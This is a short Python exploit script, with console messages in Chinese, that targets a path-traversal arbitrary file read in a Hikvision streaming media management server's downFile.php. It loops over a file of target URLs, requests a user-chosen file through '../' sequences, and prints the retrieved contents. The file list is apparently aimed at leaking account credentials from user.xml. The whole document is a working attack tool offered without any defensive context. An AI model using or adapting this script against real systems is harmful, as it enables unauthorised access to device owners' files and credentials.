import requests
import time
import urllib3
urllib3.disable_warnings()

def target_url(url,filename):
    target_url = url + f"/systemLog/downFile.php?fileName=../../../../../../../{filename}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
    }

    try:
        res = requests.get(url=target_url,headers=headers,verify=False, timeout=5)
        if res.status_code == 200 and "window.history.back(-1)" in res.text:
            print("[----------------------------------------------]")
            print(f"[0]  目标系统: {url} 不存在该文件{filename}")
        elif res.status_code == 200:
            print("[----------------------------------------------]")
            print(f"\033[31m[!]  目标系统: {url} 存在任意文件读取！")
            print(f"[!] 正在读取文件:{filename} 中.......\033[0m")
            time.sleep(1)
            print(f"[-] 文件内容为:\n {res.text}")
        else:
            print("[----------------------------------------------]")
            print("[0] 目标系统连接失败！")

    except Exception as e:
        print("[----------------------------------------------]")
        print("[0]  目标系统出现意外情况！\n",e)


if __name__ == "__main__":
    filename = str(input("[-] 请输入需要读取的文件:\n"))
    with open("HIKVISION 流媒体管理服务器 user.xml 账号密码泄漏漏洞.txt","r") as urls:
        for url in urls:
            if url[:4] != "http":
                url = "http://" +url
            url = url.strip()
            target_url(url,filename)
    urls.close()
